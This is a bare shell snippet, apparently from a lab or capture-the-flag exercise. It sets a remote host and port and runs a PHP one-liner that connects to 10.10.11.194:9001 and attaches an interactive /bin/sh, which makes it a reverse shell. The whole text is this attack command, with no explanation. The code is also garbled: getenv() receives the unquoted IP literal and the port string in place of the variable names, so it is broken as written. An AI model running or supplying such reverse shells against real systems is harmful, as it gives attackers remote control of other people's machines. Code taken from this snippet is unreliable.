export RHOST=10.10.11.194
export RPORT=9001
php -r '$sock=fsockopen(getenv(10.10.11.194),getenv("9001"));exec("/bin/sh -i <&3 >&3 2>&3");'
